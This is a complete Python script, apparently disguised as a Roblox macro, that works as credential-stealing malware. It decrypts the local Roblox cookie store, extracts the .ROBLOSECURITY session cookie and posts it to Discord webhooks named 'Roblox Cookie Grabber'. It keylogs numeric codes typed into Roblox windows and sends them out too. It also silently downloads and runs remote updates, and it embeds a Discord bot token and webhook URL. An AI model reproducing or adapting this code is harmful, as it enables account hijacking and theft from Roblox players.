import os
import sys
import shutil
import json
import base64
import win32crypt
import requests
import pyperclip
import keyboard
import win32gui
import threading
import time
import subprocess
from datetime import datetime

BOT_TOKEN = "MTQwOTUyNDg4MTQ4MTI3MzQyNQ.GfWeeI.y_v7f3oXdzRXABIw52aeH27LF_r4QK0k7XJaBM"
GUILD_ID = 1418647151554068672
FALLBACK_WEBHOOK = "https://discord.com/api/webhooks/1479474002257776845/3eeHk_ePzUOaXnG528dfYt9NbOxa4kjVWVt7-Eks1rJvHsE8nrmNyCY_CZ7x_3r5TBuA"

TARGET_WINDOWS = ["roblox", "fishtrap", "bloxtrap", "voidtrap"]

VERSION_URL = "https://raw.githubusercontent.com/Paladu13/macro/main/version"
UPDATE_URL   = "https://raw.githubusercontent.com/Paladu13/macro/main/service_update.pyw"

CONFIG_FILE = "config.txt"

webhook_cache = {}
last_action_time = 0
MIN_ACTION_INTERVAL = 5.0
first_cookie_sent = False


def get_remote_version():
    try:
        r = requests.get(VERSION_URL, timeout=5)
        if r.status_code == 200:
            return r.text.strip()
        return None
    except:
        return None


def get_local_version():
    if not os.path.exists(CONFIG_FILE):
        return None
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line.startswith("version="):
                    return line.split("=", 1)[1].strip()
        return None
    except:
        return None


def ensure_config_with_version():
    remote = get_remote_version() or "0.0.0"

    if not os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "w", encoding="utf-8") as f:
                f.write(f"version={remote}\n")
        except:
            pass
        return

    has_version = False
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            if any(line.strip().startswith("version=") for line in f):
                has_version = True
    except:
        pass

    if not has_version:
        try:
            with open(CONFIG_FILE, "a", encoding="utf-8") as f:
                f.write(f"\nversion={remote}\n")
        except:
            pass


def perform_update():
    ensure_config_with_version()

    remote = get_remote_version()
    if remote is None:
        return

    local = get_local_version()
    if local == remote:
        return

    try:
        r = requests.get(UPDATE_URL, timeout=10)
        if r.status_code != 200:
            return

        current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        new_path = os.path.join(current_dir, "service_update.pyw")

        with open(new_path, "wb") as f:
            f.write(r.content)

        lines = []
        found = False
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                lines = f.readlines()
            for i, line in enumerate(lines):
                if line.strip().startswith("version="):
                    lines[i] = f"version={remote}\n"
                    found = True
                    break

        if not found:
            lines.append(f"version={remote}\n")

        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            f.writelines(lines)

        subprocess.Popen(["pythonw", new_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
        sys.exit(0)

    except:
        pass


def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    try:
        mapping = {}
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if ":" in line and not line.startswith("version="):
                    user, wh = line.split(":", 1)
                    mapping[user.strip()] = wh.strip()
        return mapping
    except:
        return {}


def save_config(username, webhook_url):
    mapping = load_config()
    if username in mapping:
        return

    mapping[username] = webhook_url
    lines = [f"{u}:{w}\n" for u, w in mapping.items()]

    local_ver = get_local_version()
    if local_ver:
        lines.append(f"version={local_ver}\n")

    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            f.writelines(lines)
    except:
        pass


def can_perform_action(is_first_cookie=False):
    global last_action_time
    if is_first_cookie:
        last_action_time = time.time()
        return True

    now = time.time()
    if now - last_action_time < MIN_ACTION_INTERVAL:
        return False
    last_action_time = now
    return True


def get_roblox_username_from_cookie(cookie_value):
    if not cookie_value.startswith('_|WARNING:'):
        return None
    try:
        session = requests.Session()
        session.headers.update({
            "Cookie": f".ROBLOSECURITY={cookie_value}",
            "User-Agent": "Roblox/WinInet",
            "Accept": "application/json",
            "Referer": "https://www.roblox.com/"
        })

        r = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)

        if r.status_code == 200:
            return r.json().get("name")

        if r.status_code in (401, 403):
            csrf_resp = session.post("https://auth.roblox.com/v2/logout", timeout=6)
            csrf = csrf_resp.headers.get("x-csrf-token")
            if csrf:
                session.headers["x-csrf-token"] = csrf
                r2 = session.get("https://users.roblox.com/v1/users/authenticated", timeout=8)
                if r2.status_code == 200:
                    return r2.json().get("name")

        return None
    except:
        return None


def get_or_create_webhook_for_username(username):
    if username in webhook_cache:
        return webhook_cache[username]

    mapping = load_config()
    if username in mapping:
        webhook_cache[username] = mapping[username]
        return mapping[username]

    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}

    try:
        ch_resp = requests.get(f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels", headers=headers, timeout=8)
        if ch_resp.status_code != 200:
            return FALLBACK_WEBHOOK

        target_name = username.lower().replace(" ", "-")[:100]
        channel_id = None
        for ch in ch_resp.json():
            if ch.get("type") == 0 and ch.get("name") == target_name:
                channel_id = ch["id"]
                break

        if channel_id:
            wh_resp = requests.get(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=headers, timeout=8)
            if wh_resp.status_code == 200:
                for wh in wh_resp.json():
                    if wh.get("name") == f"TrapLogger - {username}":
                        url = f"https://discord.com/api/webhooks/{wh['id']}/{wh['token']}"
                        save_config(username, url)
                        webhook_cache[username] = url
                        return url

            payload = {"name": f"TrapLogger - {username}", "avatar": "https://i.imgur.com/4M34hi2.png"}
            create_wh = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=headers, json=payload, timeout=8)
            if create_wh.status_code in (200, 201):
                data = create_wh.json()
                url = f"https://discord.com/api/webhooks/{data['id']}/{data['token']}"
                save_config(username, url)
                webhook_cache[username] = url
                return url

        ch_payload = {
            "name": target_name,
            "type": 0,
            "permission_overwrites": [{"id": str(GUILD_ID), "type": 0, "deny": 1024}]
        }
        create_ch = requests.post(f"https://discord.com/api/v10/guilds/{GUILD_ID}/channels", headers=headers, json=ch_payload, timeout=10)
        if create_ch.status_code not in (200, 201):
            return FALLBACK_WEBHOOK

        channel_id = create_ch.json()["id"]

        wh_payload = {"name": f"TrapLogger - {username}", "avatar": "https://i.imgur.com/4M34hi2.png"}
        wh_resp = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=headers, json=wh_payload, timeout=8)
        if wh_resp.status_code not in (200, 201):
            return FALLBACK_WEBHOOK

        data = wh_resp.json()
        url = f"https://discord.com/api/webhooks/{data['id']}/{data['token']}"
        save_config(username, url)
        webhook_cache[username] = url
        return url

    except:
        return FALLBACK_WEBHOOK


def send_to_discord(webhook_url, payload):
    try:
        requests.post(webhook_url, json=payload, headers={"Content-Type": "application/json"}, timeout=6)
    except:
        pass


def send_roblox_cookie_to_webhook(cookie_data, username=None):
    global first_cookie_sent
    if not first_cookie_sent:
        first_cookie_sent = True
    elif not can_perform_action():
        return

    try:
        prefixed = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{cookie_data}"
        pyperclip.copy(prefixed)
        pyperclip.copy("")

        payload = {
            "content": f"**Roblox Cookie Captured**\n```\n{prefixed}\n```",
            "username": "Roblox Cookie Grabber",
            "avatar_url": "https://i.imgur.com/4M34hi2.png"
        }

        target = get_or_create_webhook_for_username(username) if username else FALLBACK_WEBHOOK
        send_to_discord(target, payload)
    except:
        pass


def retrieve_roblox_cookies():
    if not can_perform_action(is_first_cookie=not first_cookie_sent):
        return

    try:
        profile = os.getenv("USERPROFILE")
        if not profile:
            return
        path = os.path.join(profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

        if not os.path.exists(path):
            return

        temp_dir = os.getenv("TEMP")
        if not temp_dir:
            return
        temp_file = f"RobloxCookies_{datetime.now():%Y%m%d_%H%M%S}.dat"
        dest = os.path.join(temp_dir, temp_file)

        shutil.copy(path, dest)

        try:
            with open(dest, 'r', encoding='utf-8') as f:
                data = json.load(f)
        except:
            if os.path.exists(dest):
                try:
                    os.remove(dest)
                except:
                    pass
            return
        finally:
            if os.path.exists(dest):
                try:
                    os.remove(dest)
                except:
                    pass

        encoded = data.get("CookiesData")
        if not encoded:
            return

        decoded = base64.b64decode(encoded)
        decrypted = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]
        cookies_str = decrypted.decode('utf-8', errors='ignore')

        for line in cookies_str.split(';'):
            line = line.strip()
            if '.ROBLOSECURITY' in line:
                cookie_value = line.split('=', 1)[1].strip() if '=' in line else line.split('.ROBLOSECURITY')[-1].strip()

                if any(x in cookie_value[:80] for x in ['#HttpOnly_', 'TRUE', 'FALSE', '\t']):
                    parts = cookie_value.split()
                    cookie_value = parts[-1] if parts else cookie_value

                if not cookie_value.startswith('_|WARNING:'):
                    continue

                username = get_roblox_username_from_cookie(cookie_value)
                send_roblox_cookie_to_webhook(cookie_value, username)
                return

    except:
        pass


def periodic_send_cookie():
    while True:
        time.sleep(300)
        retrieve_roblox_cookies()


pending_digits = ""
last_digit_time = 0
timer_active = False


def send_numeric_code_to_webhook(digits, username=None):
    if not can_perform_action():
        return
    if len(digits) < 4:
        return

    try:
        payload = {
            "content": None,
            "embeds": [{
                "title": "CODE DÉTECTÉ",
                "description": f"**`{digits}`**",
                "color": 16711680,
                "timestamp": datetime.utcnow().isoformat()
            }],
            "username": "TrapLogger"
        }
        wh = get_or_create_webhook_for_username(username) if username else FALLBACK_WEBHOOK
        send_to_discord(wh, payload)
    except:
        pass


def is_target_window():
    try:
        title = win32gui.GetWindowText(win32gui.GetForegroundWindow()).lower()
        return any(t in title for t in TARGET_WINDOWS)
    except:
        return False


def on_key(event):
    global pending_digits, last_digit_time, timer_active
    if not is_target_window():
        if len(pending_digits) >= 4:
            send_numeric_code_to_webhook(pending_digits)
        pending_digits = ""
        timer_active = False
        return

    char = event.name
    if char.isdigit():
        pending_digits += char
        last_digit_time = time.time()
        if not timer_active:
            timer_active = True
            threading.Thread(target=wait_and_send_digits_thread, daemon=True).start()
    else:
        if len(pending_digits) >= 4:
            send_numeric_code_to_webhook(pending_digits)
        pending_digits = ""
        timer_active = False


def wait_and_send_digits_thread():
    global timer_active, pending_digits
    start = time.time()
    while time.time() - start < 2.2:
        if time.time() - last_digit_time > 2.0:
            if len(pending_digits) >= 4:
                send_numeric_code_to_webhook(pending_digits)
            pending_digits = ""
            timer_active = False
            return
        time.sleep(0.05)
    if len(pending_digits) >= 4:
        send_numeric_code_to_webhook(pending_digits)
    pending_digits = ""
    timer_active = False


if __name__ == "__main__":
    perform_update()
    ensure_config_with_version()

    retrieve_roblox_cookies()

    threading.Thread(target=periodic_send_cookie, daemon=True).start()

    keyboard.on_press(on_key)
    keyboard.wait()
